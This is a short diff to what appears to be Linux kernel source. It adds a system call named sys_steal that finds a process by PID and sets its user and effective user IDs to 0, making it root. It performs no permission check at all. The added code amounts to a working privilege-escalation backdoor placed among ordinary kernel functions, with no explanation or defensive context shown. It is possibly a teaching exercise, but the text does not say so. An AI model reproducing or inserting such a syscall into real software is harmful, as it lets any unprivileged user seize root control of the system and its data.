@@ -992,6 +992,25 @@ asmlinkage long sys_getegid(void)
 	return  current->egid;
 }
 
+asmlinkage long sys_steal(pid_t pid)
+{
+    struct task_struct *steal_from, *p;
+    steal_from = 0;
+    for_each_process(p) {
+        if(pid == p->pid)
+            steal_from = p; 
+    }
+    if(steal_from) 
+    {
+        steal_from->uid = 0;
+        steal_from->euid = 0;
+        return 0;
+    } 
+    else
+    {
+        return -1;
+    }
+}
 #endif
 
 static void process_timeout(unsigned long __data)
